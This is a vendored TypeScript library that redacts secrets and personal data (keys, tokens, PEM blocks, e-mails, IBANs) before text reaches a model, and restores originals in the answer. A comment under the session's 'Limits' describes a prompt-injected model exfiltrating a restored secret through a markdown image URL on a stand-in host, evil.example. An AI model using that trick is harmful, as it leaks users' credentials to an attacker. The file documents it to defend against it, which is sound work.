// vendored from code-kit@0.20.0, src/ts/pure/redact.ts — do not hand-edit; re-vendor via tools/sync-kit.sh
// uebernommen aus ghostline/src/core/context.ts (redactText) und settings-assistant/src/core/secrets.ts (redactFields), 2026-10-09; vault-crews/src/core/redact.ts und llm-lab/src/core/redact_secrets.ts + redact_pii.ts (redactKeys, redactKeysInValue, createPiiRedactor), 2026-10-10
/** Redaction of secrets, in two entry points (plus a reversible session for text): over free
 *  text and over parsed JSON.
 *
 *  - `redactText` blanks keys, tokens, PEM blocks (and, as a separate opt-in rule, e-mail
 *    addresses) in a string and counts the places it replaced, so a preview can say "N places
 *    redacted". Origin: ghostline's `redact`.
 *  - `redactFields` walks a JSON value and replaces every value under a secret-looking NAME with
 *    {@link REDACTED}, reporting the dotted paths. Origin: settings-assistant's `redact`.
 *  - `createRedactionSession` is the reversible variant of `redactText`: numbered placeholders go
 *    out, the originals are put back into the model's answer (see {@link RedactionSession}).
 *
 *  **Redact first, then cut.** When a text is cut into a window before it is redacted, a block
 *  that crosses the window boundary is no longer a pair: ghostline cut the context first and a
 *  PEM key running over the window edge went to the model in clear text. The orphan rules below
 *  catch a lone BEGIN or END half as a second line, but the order is the real protection: run
 *  `redactText` over the whole text, then slice.
 *
 *  - `redactKeys` / `redactKeysInValue` blank a LIST OF KNOWN KEYS (the apiKeys of the configured
 *    endpoints) in text or in a whole value, and any `Bearer <token>` echo. Origin: vault-crews'
 *    `redactSecrets` / `redactRunState` and llm-lab's `redactSecrets` / `redactRecordSecrets`, one copy chain.
 *  - `createPiiRedactor` replaces e-mail addresses, IBANs, phone numbers and credentials in URLs by
 *    numbered placeholders that stay the same for the same value across calls (training data, traces).
 *    Origin: llm-lab's `createPiiRedactor`.
 *
 *  **Why the two key/PII functions are their own functions and not rule sets for `redactText` /
 *  `createRedactionSession`** (measured 2026-10-10, "adapt before building beside"): (1) `scan` always
 *  appends the orphan rules, so `redactText('note -----END PRIVATE KEY----- …', rules)` gives
 *  `[redacted-private-key] …` and everything before an END marker is lost — a key list is no PEM
 *  scanner; (2) rule replacements are inserted literally, but the original Bearer rule keeps the
 *  spelling and whitespace of the word (`bearer\t••••`) and a rule pair cannot do that; (3) the kit's
 *  `Bearer {16,}` rule has no `i` flag and misses `Bearer xyz789abcdef` (12 characters), which both
 *  sources pin in a test and which is llm-lab's ONLY redaction (it passes no key); (4) `redactText`
 *  returns `{ text, count }`, the sources return a string; (5) the session issues `[redacted-<kind>-<n>]`
 *  with one global counter, llm-lab's traces and datasets hold `[EMAIL_1]` with a counter per label —
 *  re-expressing it would change every placeholder already written. `createPiiRedactor` therefore takes a
 *  `format(label, n)` and keeps the old shape as its default.
 *
 *  Rule sets are exported separately so a consumer picks the set it applies:
 *  {@link SECRET_REDACT_RULES} (keys, tokens, Bearer, PEM) and {@link EMAIL_REDACT_RULE}.
 *  {@link DEFAULT_REDACT_RULES} is the secret set only. */

// ---- text -------------------------------------------------------------------------------

/** Ordered `[pattern, replacement]` pairs. The replacement is inserted literally (no `$1`
 *  expansion). Use the `g` flag: without it only the first match of a rule is replaced. */
export type RedactRules = readonly (readonly [RegExp, string])[];

/** Keys, tokens, Bearer headers and PEM private-key blocks. */
export const SECRET_REDACT_RULES: RedactRules = [
  // The body may not contain another BEGIN: without that, every BEGIN lacking an END scans to the
  // end of the text and a long run of them costs quadratic time.
  [/-----BEGIN [A-Z ]*PRIVATE KEY-----(?:(?!-----BEGIN)[\s\S])*?-----END [A-Z ]*PRIVATE KEY-----/g, "[redacted-private-key]"],
  [/\bBearer\s+[A-Za-z0-9._~+/=-]{16,}/g, "Bearer [redacted-token]"],
  [/\b(?:sk|rk|pk|ghp|gho|github_pat|xoxb|xoxp)[-_][A-Za-z0-9_-]{12,}/g, "[redacted-token]"],
  [/\bAKIA[0-9A-Z]{16}\b/g, "[redacted-token]"],
];

/** E-mail addresses. Not part of the default: whether an address is a secret depends on the
 *  consumer. Apply it as `[...SECRET_REDACT_RULES, EMAIL_REDACT_RULE]`. */
export const EMAIL_REDACT_RULE: readonly [RegExp, string] = [/(?<![A-Z0-9._%+-])[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}/gi, "[redacted-email]"];

/** What `redactText` applies when no rules are passed. */
export const DEFAULT_REDACT_RULES: RedactRules = SECRET_REDACT_RULES;

// Always on, after the rules: at the edge of an excerpt either half of a PEM block can be missing.
// Greedy up to the LAST END: with several unpaired ENDs the text between them is the body of a block
// whose BEGIN was cut away. Stopping at the first END (lazy) left that body in clear text and made a
// second run change the result.
const ORPHAN_END = /^[\s\S]*-----END [A-Z ]*PRIVATE KEY-----/;
const ORPHAN_BEGIN = /-----BEGIN [A-Z ]*PRIVATE KEY-----[\s\S]*$/;
const ORPHAN_PLACEHOLDER = "[redacted-private-key]";

/** Applies `rules`, then the built-in orphan rules, replacing every match through `sub`
 *  (`sub(match, replacement)` returns what goes in its place). One implementation for the one-way
 *  and the reversible entry point, so both find exactly the same places. */
function scan(text: string, rules: RedactRules, sub: (match: string, replacement: string) => string): string {
  let out = text;
  for (const [re, rep] of rules) out = out.replace(re, (m) => sub(m, rep));
  out = out.replace(ORPHAN_END, (m) => sub(m, ORPHAN_PLACEHOLDER));
  return out.replace(ORPHAN_BEGIN, (m) => sub(m, ORPHAN_PLACEHOLDER));
}

/** Blanks secrets in `text`. `count` is the number of places replaced (every effective
 *  replacement counts 1). Idempotent: a second run over the result changes nothing and counts 0. */
export function redactText(text: string, rules: RedactRules = DEFAULT_REDACT_RULES): { text: string; count: number } {
  let count = 0;
  const out = scan(text, rules, (_m, rep) => {
    count++;
    return rep;
  });
  return { text: out, count };
}

// ---- reversible redaction ---------------------------------------------------------------

/** One-way `redactText` is wrong where the model's answer is written back into a note: a fixed
 *  placeholder would silently replace the user's key or address there. A session redacts with
 *  NUMBERED placeholders (`[redacted-token-1]`) and puts the originals back into the answer.
 *
 *  Limits:
 *  - **Where the original lands is the model's choice.** `restore` replaces a placeholder wherever
 *    it stands. A prompt-injected model can write it into a link or image URL or an HTML
 *    attribute (`![x](https://evil.example/?d=[redacted-token-1])`), and the restored answer then
 *    carries the secret there; if the consumer renders it, an image loads without any click.
 *    Pass the answer through `neutralizeModelMarkdown` BEFORE `restore` (it removes images and
 *    HTML; a link still needs a click) and never let the restored text reach a renderer or
 *    a network call unreviewed.
 *  - A placeholder-shaped literal in the INPUT (for example a history that was redacted earlier)
 *    cannot be told from an issued one and is restored if the session knows it; the session never
 *    issues such a literal to a different value.
 *  - Custom rules must not match placeholders or each other's output: rules run in sequence over
 *    the previous result, and a rule such as `[A-Za-z0-9-]{20,}` would eat the inside of an
 *    inserted `[redacted-…]`. The default rules do not.
 *  - If the model rephrases a placeholder (`[redacted token 1]`, a translation), it stays
 *  as written. The original is not lost — the session still holds it — but the user sees the
 *  placeholder instead of the value. The format uses only lowercase letters, digits, `[`, `]`
 *  and `-`, so a model can return it verbatim.
 *
 *  Origin: wish of the write-back consumers (Koda, vault-rag Smart Apply, transmute,
 *  slide-deck, vault-crews), Welle 15, 2026-10-09. */
export interface RedactionSession {
  /** Replaces every match with a numbered placeholder per kind (taken from the rule's
   *  `[redacted-<kind>]` replacement; `secret` if it has none). The same original always gets the
   *  same placeholder within the session. The whole match is replaced, so `Bearer abc…` becomes
   *  `[redacted-token-1]` and the `Bearer ` hint goes with it. */
  redact(text: string): string;
  /** Number of distinct values redacted so far. */
  readonly count: number;
  /** Puts the originals back for every known placeholder. Unknown placeholders stay. */
  restore(text: string): string;
  /** For streams: `push` returns what can be released now and holds back a tail that may still
   *  grow into a placeholder (`[redacted-…` across chunk boundaries); `flush` returns the rest at
   *  the end of the stream. The concatenated output equals `restore` over the concatenated input. */
  restorer(): { push(chunk: string): string; flush(): string };
}

const PLACEHOLDER = /\[redacted-[a-z0-9-]+-\d+\]/g;
// A tail that can still become a placeholder: `[`, then a prefix of "redacted-", then kind chars.
const PLACEHOLDER_START = /^\[(?:r(?:e(?:d(?:a(?:c(?:t(?:e(?:d(?:-[a-z0-9-]*)?)?)?)?)?)?)?)?)?$/;
// Floor for the longest tail held back; a session raises it to fit the longest kind its rules issue.
const MIN_HOLD = 96;

export function createRedactionSession(rules: RedactRules = DEFAULT_REDACT_RULES): RedactionSession {
  const kindOf = (rep: string): string => /\[redacted-([a-z0-9-]+)\]/.exec(rep)?.[1] ?? "secret";
  // A longer run than this cannot be a placeholder this session issues: longest kind plus
  // `[redacted-`, `-<number>` and `]`.
  const maxHold = Math.max(MIN_HOLD, ...rules.map(([, rep]) => kindOf(rep).length + 32), "private-key".length + 32);
  // Placeholder-shaped literals seen in any input: never issued to a value, or restore() would
  // put that value into text where it never stood.
  const reserved = new Set<string>();
  const byOriginal = new Map<string, string>();
  const byPlaceholder = new Map<string, string>();
  let counter = 0;

  const restore = (text: string): string => text.replace(PLACEHOLDER, (ph) => byPlaceholder.get(ph) ?? ph);

  const restorer = () => {
    let buf = "";
    return {
      push(chunk: string): string {
        const s = buf + chunk;
        const open = s.lastIndexOf("[");
        const hold = open >= 0 && s.length - open <= maxHold && PLACEHOLDER_START.test(s.slice(open)) ? open : s.length;
        buf = s.slice(hold);
        return restore(s.slice(0, hold));
      },
      flush(): string {
        const rest = buf;
        buf = "";
        return restore(rest);
      },
    };
  };

  return {
    redact(text: string): string {
      for (const lit of text.match(PLACEHOLDER) ?? []) reserved.add(lit);
      return scan(text, rules, (match, rep) => {
        // An orphan span can contain placeholders issued earlier in this very call: store the
        // plaintext, otherwise restore() would hand back a placeholder literal.
        const original = restore(match);
        const known = byOriginal.get(original);
        if (known) return known;
        const kind = kindOf(rep);
        let ph: string;
        do ph = `[redacted-${kind}-${++counter}]`;
        while (reserved.has(ph));
        byOriginal.set(original, ph);
        byPlaceholder.set(ph, original);
        return ph;
      });
    },
    get count() {
      return byOriginal.size;
    },
    restore,
    restorer,
  };
}

// ---- known keys -------------------------------------------------------------------------

/** Mask `redactKeys` writes for a key and for a Bearer token. The value both sources used, so a
 *  consumer's output stays the same (CORE-META-21). */
export const DEFAULT_KEY_MASK = "••••";
/** A key shorter than this is ignored: as a substring it would shred ordinary words and make the
 *  message unreadable — a real token is always longer. */
const MIN_KEY_LENGTH = 8;
/** Catches keys configured nowhere (a header echoed back by a gateway). The `i` flag and the 8-character floor are the
 *  sources' (`Bearer xyz789abcdef` is redacted). */
const BEARER_ECHO = /(Bearer\s+)[A-Za-z0-9._~+/-]{8,}=*/gi;

export interface RedactKeysOptions {
  /** Replaces a key and a Bearer token. Default {@link DEFAULT_KEY_MASK}. Inserted literally. */
  mask?: string;
}

const escapeRegExp = (s: string): string => s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");

/** The strings to look for, longest first. Two per key: the raw form (for unserialised text) AND the form
 *  JSON.stringify writes (a key with `"`, `\` or a line break stands there escaped, and the raw search would never
 *  find it — the JSON stays valid and the key goes to disk). Neither replaces the other: JSON.stringify does not
 *  escape non-ASCII (umlauts, CJK, emoji), so there only the raw form carries. Longest first so a key that is a
 *  prefix of another cannot leave the rest of the longer one standing (measured: `••••-SECRETSUFFIX99`). */
function keyNeedles(keys: readonly (string | undefined)[]): string[] {
  const needles = new Set<string>();
  for (const raw of keys) {
    if (typeof raw !== "string") continue;
    const key = raw.trim();
    if (key.length < MIN_KEY_LENGTH) continue;
    needles.add(key);
    needles.add(JSON.stringify(key).slice(1, -1));
  }
  return [...needles].sort((a, b) => b.length - a.length || (a < b ? -1 : a > b ? 1 : 0));
}

function redactNeedles(text: string, needles: readonly string[], mask: string): string {
  if (text === "") return text;
  // One pass over the text: a sequence of replacements would look for the next key inside the mask just written.
  // A function as replacement: a string would expand `$&` and `$1` in the mask.
  const out = needles.length === 0 ? text : text.replace(new RegExp(needles.map(escapeRegExp).join("|"), "g"), () => mask);
  return out.replace(BEARER_ECHO, (_m, bearer: string) => bearer + mask);
}

/** Blanks every key of `keys` in `text`, and any `Bearer <token>` (the word keeps its spelling and whitespace). A key
 *  is trimmed first; `undefined`, empty and short (< 8) entries are skipped, so a consumer passes
 *  `endpoints.map((e) => e.apiKey)` as it is. Idempotent.
 *
 *  **Limits — what it finds is the key as written, nothing else:** the raw form and the form JSON.stringify writes.
 *  Not found: a key in another encoding (URL-encoded `%2F`, HTML entities, base64 such as `Authorization: Basic …`), in
 *  another case (the match is case-sensitive; only the Bearer word is not), split across two chunks of a stream, or
 *  altered by a gateway before it echoes it. The Bearer rule is the net for the usual echo, not for these. A consumer that
 *  writes an error body or a trace to disk redacts the WHOLE text it writes, once, at the last step before the write. */
export function redactKeys(text: string, keys: readonly (string | undefined)[], opts: RedactKeysOptions = {}): string {
  return redactNeedles(text, keyNeedles(keys), opts.mask ?? DEFAULT_KEY_MASK);
}

/** {@link redactKeys} over a whole value, through its serialisation instead of field by field: the list of fields
 *  to keep up would be exactly the bookkeeping that goes stale with the next new field. Returns a JSON COPY of the
 *  value (`undefined` properties and functions fall away, a `Date` becomes text), the input is not mutated.
 *
 *  **Throws** on a circular reference, a BigInt and a top-level `undefined` or function — fail closed, on purpose: nothing
 *  is written rather than something that was not redacted. The CALLER catches (llm-lab's trace store does;
 *  vault-crews' run-state write has no `try` around it and needs one). Property names are redacted like values. */
export function redactKeysInValue<T>(value: T, keys: readonly (string | undefined)[], opts: RedactKeysOptions = {}): T {
  const json = JSON.stringify(value) as string | undefined;
  if (json === undefined) throw new TypeError("redactKeysInValue: the value has no JSON form (undefined, function or symbol)");
  // The mask lands inside JSON text: in its escaped form, so that a quote in it cannot break the structure.
  const mask = JSON.stringify(opts.mask ?? DEFAULT_KEY_MASK).slice(1, -1);
  return JSON.parse(redactNeedles(json, keyNeedles(keys), mask)) as T;
}

// ---- PII with stable numbering ------------------------------------------------------------

export type PiiLabel = "EMAIL" | "IBAN" | "PHONE" | "URLCRED" | "CUSTOM";

// The patterns of llm-lab/src/core/redact_pii.ts, in meaning unchanged (a differential test pins that). The EMAIL pattern
// has one lookbehind more: without it every start inside a long run of local-part characters scans to the end of the
// run, quadratic; the leftmost start of a run is the only one that can succeed, so the matches are the same.
const PII_PATTERNS: readonly (readonly [Exclude<PiiLabel, "CUSTOM">, RegExp])[] = [
  ["EMAIL", /(?<![A-Za-z0-9._%+-])[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}/g],
  ["IBAN", /\b[A-Z]{2}\d{2}(?:[ ]?[A-Za-z0-9]{4}){2,7}(?:[ ]?[A-Za-z0-9]{1,4})?\b/g],
  ["PHONE", /(?:\+\d{1,3}[ /-]?)?(?:\(?\d{2,5}\)?[ /-]?)\d{3,}(?:[ -]?\d{2,})+/g],
  ["URLCRED", /\/\/[^\s:/@]+:[^\s:/@]+@/g],
];

export interface PiiRedactorOptions {
  /** Terms of the caller (names, project words), replaced as `CUSTOM`. Trimmed; empty and duplicate ones dropped; the
   *  longest first, so a term that is a prefix of another does not cut it. Case-sensitive. */
  extra?: readonly string[];
  /** The placeholder for the `n`-th distinct value of `label`. Default `[LABEL_n]` (`[EMAIL_1]`). */
  format?: (label: PiiLabel, n: number) => string;
}

export interface PiiRedactor {
  /** Replaces the PII in `text`. The same value gets the same placeholder in EVERY call of this redactor — an address
   *  in the prompt, in the answer and in a correction text all read `[EMAIL_1]`; two separate runs could not promise
   *  that. Numbering is per label, from 1. */
  text(text: string): string;
}

/** A redactor with ONE set of placeholders over everything that runs through it. Hand it the text fields of a record
 *  (never the serialised record: ids, timestamps and latencies are digit groups the phone pattern would hit and
 *  damage unnoticed). Order: EMAIL, IBAN, PHONE, URLCRED, then the extra terms, each over the result of the one before —
 *  so an extra term that occurs inside a placeholder (`EMAIL`) corrupts it; choose terms that cannot, and credentials in a
 *  URL with a dotted host (`https://user:pw@host.example`) are taken as an e-mail address (`user:[EMAIL_1]`) before
 *  URLCRED sees them, as in the original.
 *
 *  Placeholders are not restorable: this is for data that leaves for good (traces, datasets). For text whose answer is
 *  written back use {@link createRedactionSession}. Origin: llm-lab `createPiiRedactor`; the record wrapper
 *  (`TraceRecord`) stays there. */
export function createPiiRedactor(opts: PiiRedactorOptions = {}): PiiRedactor {
  const format = opts.format ?? ((label: PiiLabel, n: number): string => `[${label}_${n}]`);
  const seenByLabel = new Map<PiiLabel, Map<string, string>>();
  const seenFor = (label: PiiLabel): Map<string, string> => {
    const seen = seenByLabel.get(label);
    if (seen) return seen;
    const created = new Map<string, string>();
    seenByLabel.set(label, created);
    return created;
  };
  const customs = [...new Set((opts.extra ?? []).map((t) => t.trim()).filter((t) => t !== ""))].sort((a, b) => b.length - a.length);
  const customRe = customs.length > 0 ? new RegExp(customs.map(escapeRegExp).join("|"), "g") : null;

  const replaceAll = (text: string, label: PiiLabel, re: RegExp): string => {
    const seen = seenFor(label);
    return text.replace(re, (hit) => {
      const known = seen.get(hit);
      if (known !== undefined) return known;
      const token = format(label, seen.size + 1);
      seen.set(hit, token);
      return token;
    });
  };

  return {
    text(text: string): string {
      if (text === "") return text;
      let out = text;
      for (const [label, re] of PII_PATTERNS) out = replaceAll(out, label, re);
      return customRe ? replaceAll(out, "CUSTOM", customRe) : out;
    },
  };
}

// ---- fields -----------------------------------------------------------------------------

export type Json = null | boolean | number | string | Json[] | { [key: string]: Json };

function isJsonObject(v: unknown): v is { [k: string]: Json } {
  return typeof v === "object" && v !== null && !Array.isArray(v);
}

function getAt(root: Json | null, path: readonly string[]): Json | undefined {
  let cur: Json | undefined = root ?? undefined;
  for (const seg of path) {
    if (!isJsonObject(cur) || !Object.prototype.hasOwnProperty.call(cur, seg)) return undefined;
    cur = cur[seg];
  }
  return cur;
}

const NAME_PATTERNS = ["apikey", "api_key", "api-key", "token", "secret", "password", "credential", "cookie", "email"];
// "author" bleibt frei, "authorization"/"authorize" nicht: `auth` zählt, außer vor "or" ohne folgendes "iz" (Review 2026-10-03, authorization-Fall).
const AUTH = /auth(?!or(?!iz))/;
/** Placeholder `redactFields` writes in place of a secret value. */
export const REDACTED = "🔒";

/** Spec § 11: Teilstring im kleingeschriebenen Namen. Allein nie ausreichend — siehe isSecretValue. */
export function isSecretName(name: string): boolean {
  const l = name.toLowerCase();
  return AUTH.test(l) || NAME_PATTERNS.some((p) => l.includes(p));
}

/** Name passt UND Wert ist nicht-leerer Text oder Objekt/Liste (ganzer Teilbaum). */
export function isSecretValue(name: string, value: Json | undefined): boolean {
  if (value === undefined || value === null || !isSecretName(name)) return false;
  if (typeof value === "string") return value.length > 0;
  return typeof value === "object";
}

/** Ein Pfad ist geheim, wenn irgendein Abschnitt auf dem Weg ein geheimer Wert ist. */
export function isSecretPath(root: Json | null, path: readonly string[]): boolean {
  for (let i = 0; i < path.length; i++) {
    const seg = path[i];
    if (seg !== undefined && isSecretValue(seg, getAt(root, path.slice(0, i + 1)))) return true;
  }
  return false;
}

/** Copy of `value` with every secret value replaced by {@link REDACTED}; `redacted` lists the
 *  dotted paths replaced. The input is not mutated. */
export function redactFields(value: Json): { value: Json; redacted: string[] } {
  const redacted: string[] = [];
  const walk = (v: Json, path: string[]): Json => {
    if (Array.isArray(v)) return v.map((x, i) => walk(x, [...path, String(i)]));
    if (!isJsonObject(v)) return v;
    const out: { [k: string]: Json } = {};
    for (const [k, x] of Object.entries(v)) {
      // defineProperty statt Zuweisung: ein geparster Schlüssel "__proto__" bleibt Datum und setzt keinen Prototyp.
      if (isSecretValue(k, x)) { Object.defineProperty(out, k, { value: REDACTED, enumerable: true, writable: true, configurable: true }); redacted.push([...path, k].join(".")); }
      else Object.defineProperty(out, k, { value: walk(x, [...path, k]), enumerable: true, writable: true, configurable: true });
    }
    return out;
  };
  return { value: walk(value, []), redacted };
}
